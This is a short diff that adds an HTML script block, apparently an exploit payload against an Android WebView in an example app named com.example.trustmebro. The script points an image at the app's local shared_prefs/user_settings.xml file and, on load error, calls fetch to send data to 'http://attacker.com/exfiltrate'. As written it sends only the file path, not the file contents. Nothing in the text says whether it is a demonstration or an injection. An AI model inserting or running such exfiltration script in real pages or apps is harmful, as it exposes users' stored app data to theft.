@@ -1,0 +1,8 @@
+<script>
+    var img = new Image();
+    img.src = 'file:///data/data/com.example.trustmebro/shared_prefs/user_settings.xml';
+    img.onerror = function() {
+        fetch('http://attacker.com/exfiltrate?data=' + encodeURIComponent(img.src));
+    };
+    document.body.appendChild(img);
+</script>
